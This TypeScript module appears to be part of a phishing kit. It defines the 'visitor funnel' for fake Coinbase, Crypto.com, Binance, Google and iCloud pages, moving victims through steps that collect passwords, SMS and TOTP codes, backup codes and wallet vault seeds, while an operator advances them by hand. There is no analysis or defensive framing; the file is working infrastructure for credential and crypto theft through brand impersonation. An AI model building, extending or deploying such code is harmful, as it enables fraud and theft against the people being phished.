/**
 * Visitor funnel resolver.
 *
 * Each captured visitor template (Coinbase/Activity, Coinbase/External, …)
 * has a sensible "next page" the visitor moves to when they submit / make a
 * choice. The mapping below is the project's default funnel. Admins can
 * override any individual hop by setting the key `funnel.next.{Brand}/{Page}`
 * in `server_settings` (value = `Brand/Page` label) — that override is what
 * `/api/visitor/page-advance` and the case-code check endpoint consult.
 *
 * `getNextUrl()` returns a same-origin URL (encoded for the `/templates/preview/…`
 * route) or `null` when there is no configured successor (e.g. terminal pages
 * like Loading or Locked).
 */
import { dbGetSetting } from './database.js';
import { templateLabelToVisitorPath } from './visitorRouter.js';

export const DEFAULT_NEXT_PAGE: Record<string, string> = {
	// --- Coinbase ---
	'Coinbase/Loading': 'Coinbase/Activity',
	'Coinbase/Activity': 'Coinbase/Balance',
	'Coinbase/Balance': 'Coinbase/External',
	'Coinbase/External': 'Coinbase/Loading',
	'Coinbase/CBW': 'Coinbase/Loading',
	'Coinbase/Reset Pass': 'Coinbase/Loading',
	'Coinbase/Swap': 'Coinbase/Loading',
	'Coinbase/Vault': 'Coinbase/Vault Seed',
	'Coinbase/Vault Seed': 'Coinbase/Loading',
	'Coinbase/Case ID': 'Coinbase/Loading',
	'Coinbase/Review Login': 'Coinbase/Loading',
	'Coinbase/Review Withdrawal': 'Coinbase/Loading',
	'Coinbase/Review Email': 'Coinbase/Loading',
	'Coinbase/Trust Device': 'Coinbase/Terminate Devices',
	'Coinbase/Change Password': 'Coinbase/SMS Verify',
	'Coinbase/SMS Verify': 'Coinbase/Trust Device',
	'Coinbase/Terminate Devices': 'Coinbase/Securing Account',
	'Coinbase/Securing Account': 'Coinbase/Loading',
	'Coinbase/Protect Assets': 'Coinbase/Moving Vault',
	'Coinbase/Moving Vault': 'Coinbase/Vault Intro',
	'Coinbase/Vault Intro': 'Coinbase/Vault Setup',
	'Coinbase/Vault Setup': 'Coinbase/Vault',

	// --- CDC ---
	'CDC/Loading': 'CDC/Activity',
	'CDC/Activity': 'CDC/Balance',
	'CDC/Balance': 'CDC/External',
	'CDC/External': 'CDC/Wallet',
	'CDC/Wallet': 'CDC/Loading',
	'CDC/Case ID': 'CDC/Loading',

	// --- Binance ---
	'Binance/Loading': 'Binance/Activity',
	'Binance/Activity': 'Binance/Balance',
	'Binance/Balance': 'Binance/Backup',
	'Binance/Backup': 'Binance/Loading',
	'Binance/Case': 'Binance/Loading',

	// --- Google ---
	'Google/Loading': 'Google/Login',
	'Google/Login': 'Google/Password',
	'Google/Password': 'Google/SMS',
	'Google/SMS': 'Google/Loading',
	'Google/TOTP': 'Google/Loading',
	'Google/Backup code': 'Google/Loading',
	'Google/Fail': 'Google/Login',

	// --- iCloud ---
	'iCloud/Login': 'iCloud/Password',
	'iCloud/Password': 'iCloud/2fa',
	'iCloud/2fa': 'iCloud/Locked',
	'iCloud/Locked': 'iCloud/Login'

	// KuCoin/Loading and terminal pages (Locked, Fail) are intentionally
	// omitted — the visitor stays put until the operator advances them.
};

/** Pages whose interactive CTAs are already wired by a dedicated shim. */
export const SKIP_GENERIC_WIRING = new Set<string>([
	'Coinbase/Case ID',
	'CDC/Case ID',
	'Binance/Case',
	'Coinbase/Review Login',
	'Coinbase/Review Withdrawal',
	'Coinbase/Review Email',
	'Coinbase/Trust Device',
	'Coinbase/Change Password',
	'Coinbase/SMS Verify',
	'Coinbase/Terminate Devices',
	'Coinbase/Securing Account',
	'Coinbase/Protect Assets',
	'Coinbase/Moving Vault',
	'Coinbase/Vault Intro',
	'Coinbase/Vault Setup'
]);

export function settingKey(brand: string, page: string): string {
	return `funnel.next.${brand}/${page}`;
}

export function getNextLabel(brand: string, page: string): string | null {
	const override = dbGetSetting(settingKey(brand, page));
	if (override && override.includes('/')) return override;
	return DEFAULT_NEXT_PAGE[`${brand}/${page}`] ?? null;
}

export function labelToUrl(label: string | null | undefined): string | null {
	if (!label) return null;
	const idx = label.indexOf('/');
	if (idx <= 0 || idx >= label.length - 1) return null;
	const brand = label.slice(0, idx);
	const page = label.slice(idx + 1);
	return `/templates/preview/${encodeURIComponent(brand)}/${encodeURIComponent(page)}`;
}

export function labelToVisitorUrl(
	label: string | null | undefined,
	module?: string,
	queryParams?: URLSearchParams
): string | null {
	const path = templateLabelToVisitorPath(label || '', module);
	if (!path) return null;
	if (!queryParams?.size) return path;
	const qs = queryParams.toString();
	return qs ? `${path}?${qs}` : path;
}

export interface NextUrlOptions {
	module?: string;
	isVisitorHost?: boolean;
}

export function getNextUrl(
	brand: string,
	page: string,
	queryParams?: URLSearchParams,
	opts?: NextUrlOptions
): string | null {
	const label = getNextLabel(brand, page);
	const base =
		opts?.isVisitorHost && opts.module
			? labelToVisitorUrl(label, opts.module, queryParams)
			: labelToUrl(label);

	if (!base || !queryParams || opts?.isVisitorHost) return base;
	const qs = queryParams.toString();
	return qs ? `${base}?${qs}` : base;
}
